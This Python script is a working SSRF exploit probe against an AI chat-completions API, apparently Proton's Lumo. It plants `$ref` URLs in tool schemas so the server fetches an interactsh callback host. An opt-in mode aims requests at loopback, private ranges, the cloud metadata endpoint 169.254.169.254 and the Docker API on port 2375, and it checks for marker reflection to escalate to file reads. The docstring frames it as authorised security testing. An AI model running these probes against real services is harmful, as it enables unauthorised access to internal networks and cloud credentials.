#!/usr/bin/env python3
"""Probe an [OI]-style chat/completions endpoint for SSRF via tool-schema `$ref` resolution.

Runs the full differential in the order that makes the result defensible:

  control      well-formed tool with a $ref to your listener   -> callback expected
  negative     same tool with `description` removed            -> fast 500, NO callback
  oracle       valid schema vs invalid schema from a controlled host
  internal     closed loopback port vs filtered RFC1918 host   -> timing split
  reflect      marker inside fetched doc, grep the API response

Usage:
  python ai_tool_ref_probe.py --url https://target/api/ai/v1/chat/completions \
      --oast abc123.oast.fun --model lumo-lite
  python ai_tool_ref_probe.py ... --no-auth          # drop Authorization/x-pm-uid/cookies
  python ai_tool_ref_probe.py ... --internal         # enable the private-range timing probes

Notes
-----
* `--internal` is opt-in on purpose. Only touch private ranges on an engagement that authorises
  internal probing; some programs treat internal scanning as out of bounds even when SSRF is in scope.
* Requires `interactsh-client -v` running in another shell; this script only *checks* the log file
  for the callback. It does not start the listener.
* Poll the listener before calling anything a negative — DNS + HTTP can lag 30-120 s.
"""
import argparse
import json
import sys
import time
import uuid

try:
    import requests
except ImportError:
    sys.exit("pip install requests")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
MARK = "ZZMARKER9931"


def build_body(model, ref_url, with_description=True, stream=False):
    fn = {"name": "t", "parameters": {"$ref": ref_url}}
    if with_description:
        fn["description"] = "d"
    return {
        "model": model,
        "max_tokens": 4,
        "stream": stream,
        "messages": [{"role": "user", "content": "hi"}],
        "tools": [{"type": "function", "function": fn}],
    }


def call(args, body, timeout=45):
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "User-Agent": UA,
        "x-pm-appversion": args.appversion,
    }
    if not args.no_auth:
        headers.update(args.auth_headers)
    t0 = time.time()
    try:
        r = requests.post(args.url, headers=headers, json=body, timeout=timeout)
        return r.status_code, r.text, round(time.time() - t0, 2)
    except requests.Timeout:
        return "CLIENT-TIMEOUT", "", round(time.time() - t0, 2)
    except Exception as e:  # noqa: BLE001 - surface any transport error verbatim
        return "ERROR", str(e)[:160], round(time.time() - t0, 2)


def rows(args):
    o = args.oast
    out = []

    # --- control: well-formed payload, must callback
    p = f"ctrl-{uuid.uuid4().hex[:8]}.json"
    out.append(("control (well-formed $ref)", f"https://{o}/{p}", build_body(args.model, f"https://{o}/{p}")))

    # --- negative control: no description -> must 500 fast with zero callbacks
    p = f"nodesc-{uuid.uuid4().hex[:8]}.json"
    out.append(
        (
            "negative control (no description)",
            f"https://{o}/{p}",
            build_body(args.model, f"https://{o}/{p}", with_description=False),
        )
    )

    # --- oracle: valid schema vs invalid schema (both JSON, both 200 from the remote)
    good = json.dumps({"type": "object", "properties": {"a": {"type": "string"}}, "required": ["a"]})
    bad = json.dumps({"not": "a schema", MARK: 1})
    import base64

    def b64(s):
        return base64.urlsafe_b64encode(s.encode()).decode()

    out.append(
        (
            "oracle: valid JSON Schema",
            "httpbin/base64(good)",
            build_body(args.model, "https://httpbin.org/base64/" + b64(good)),
        )
    )
    out.append(
        (
            "oracle: invalid JSON Schema",
            "httpbin/base64(bad)",
            build_body(args.model, "https://httpbin.org/base64/" + b64(bad)),
        )
    )

    # --- reflection test: marker inside the fetched doc
    out.append(
        (
            "reflection probe (marker)",
            "httpbin/base64(marked)",
            build_body(args.model, "https://httpbin.org/base64/" + b64(json.dumps({"type": "object", MARK: 1}))),
        )
    )

    # --- streaming variant
    p = f"stream-{uuid.uuid4().hex[:8]}.json"
    out.append(
        (
            "stream:true (same sink?)",
            f"https://{o}/{p}",
            build_body(args.model, f"https://{o}/{p}", stream=True),
        )
    )

    if args.internal:
        out.append(("internal: closed loopback", "http://127.0.0.1:1/", build_body(args.model, "http://127.0.0.1:1/")))
        out.append(("internal: RFC1918 filtered", "http://10.255.255.1/", build_body(args.model, "http://10.255.255.1/")))
        out.append(
            (
                "internal: link-local IMDS",
                "http://169.254.169.254/latest/meta-data/",
                build_body(args.model, "http://169.254.169.254/latest/meta-data/"),
            )
        )
        out.append(
            (
                "internal: docker bridge",
                "http://172.17.0.1:2375/",
                build_body(args.model, "http://172.17.0.1:2375/"),
            )
        )

    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--oast", required=True, help="interactsh domain, e.g. abc123.oast.fun")
    ap.add_argument("--model", default="lumo-lite")
    ap.add_argument("--appversion", default="web-lumo@1.3.0")
    ap.add_argument("--no-auth", action="store_true", help="send no Authorization / x-pm-uid / cookie")
    ap.add_argument("--uid", default="")
    ap.add_argument("--token", default="")
    ap.add_argument("--internal", action="store_true", help="enable private-range timing probes")
    ap.add_argument("--delay", type=float, default=1.5, help="seconds between requests (be gentle)")
    ap.add_argument("--json-out", default="ai_tool_ref_probe.json")
    args = ap.parse_args()

    args.auth_headers = {}
    if args.token:
        args.auth_headers["Authorization"] = "Bearer " + args.token
    if args.uid:
        args.auth_headers["x-pm-uid"] = args.uid
        args.auth_headers["Cookie"] = f"AUTH-{args.uid}={args.token}"

    print(f"target : {args.url}")
    print(f"listener: {args.oast}   auth: {'NONE' if args.no_auth else 'session'}")
    print(f"internal probes: {args.internal}\n")

    results = []
    hdr = f"{'case':38s} {'http':8s} {'secs':>7s}  note"
    print(hdr)
    print("-" * len(hdr))

    for name, dest, body in rows(args):
        status, text, secs = call(args, body)
        note = ""
        if isinstance(status, int) and status == 200:
            note = "accepted"
        elif isinstance(status, int) and status == 500:
            note = "parse/validate failed"
        if status == "CLIENT-TIMEOUT" or (isinstance(secs, float) and secs > 20):
            note = (note + " | FILTERED (>=20s)").strip(" |")
        if isinstance(secs, float) and secs < 5 and "500" in str(status):
            note = (note + " | fast fail (closed/refused)").strip(" |")
        if MARK in text:
            note += " | *** MARKER REFLECTED -> possible READ ***"
        print(f"{name:38s} {str(status):8s} {secs:>7}  {note}")
        results.append({"case": name, "dest": dest, "status": status, "secs": secs, "note": note})
        time.sleep(args.delay)

    json.dump(results, open(args.json_out, "w"), indent=1)
    print(f"\nresults -> {args.json_out}")
    print(
        "\nNEXT: poll the interactsh log for every ctrl-/stream-/nodesc- path.\n"
        "  ctrl + stream callbacks, nodesc none          -> schema resolution caused the fetch (finding)\n"
        "  ctrl none                                     -> nothing dialled; retry/back off, do NOT report\n"
        "  any nodesc callback                           -> your 'negative control' isn't one; investigate\n"
        "  MARKER REFLECTED anywhere                     -> escalate to full-read, re-measure severity\n"
        "Compare callback source IPs against your own egress before writing anything."
    )


if __name__ == "__main__":
    main()
